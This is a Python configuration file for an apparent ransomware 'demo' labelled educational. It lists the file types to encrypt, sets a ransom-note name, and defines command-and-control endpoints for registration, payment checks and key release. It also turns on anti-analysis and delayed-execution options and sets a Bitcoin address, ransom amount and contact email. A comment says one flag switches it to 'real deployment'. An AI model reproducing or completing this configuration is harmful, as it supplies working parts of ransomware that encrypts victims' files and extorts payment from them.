"""
Configuration settings for the ransomware demo
EDUCATIONAL USE ONLY
"""

import os

class Config:
    # ===== ENCRYPTION SETTINGS =====
    TARGET_EXTENSIONS = {
        '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx',
        '.jpg', '.png', '.sql', '.db', '.config', '.yml', '.json'
    }
    
    ENCRYPTION_EXTENSION = ".encrypted"
    RANSOM_NOTE_FILENAME = "READ_ME_FOR_DECRYPT.txt"
    
    # ===== C2 SERVER SETTINGS =====
    C2_SERVER = "http://localhost:5000"
    C2_ENDPOINTS = {
        'register': '/register',
        'check_payment': '/check_payment',
        'mark_paid': '/mark_paid',
        'get_key': '/get_key'
    }
    
    # ===== SECURITY SETTINGS =====
    TEST_MODE = True  # SET TO FALSE FOR REAL DEPLOYMENT (EDUCATIONAL ONLY)
    TEST_DIRECTORY = "./test_files"
    
    # Anti-analysis features
    DELAY_EXECUTION = True
    DELAY_SECONDS = 10  # Reduced for demo purposes
    ANTI_ANALYSIS_CHECKS = True
    
    # ===== PAYMENT SETTINGS =====
    BITCOIN_ADDRESS = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
    PAYMENT_AMOUNT = 0.05
    PAYMENT_EMAIL = "recover2024@protonmail.com"
    
    # ===== DEMO SETTINGS =====
    DEMO_MODE = True
    AUTO_DECRYPT_AFTER_PAYMENT = True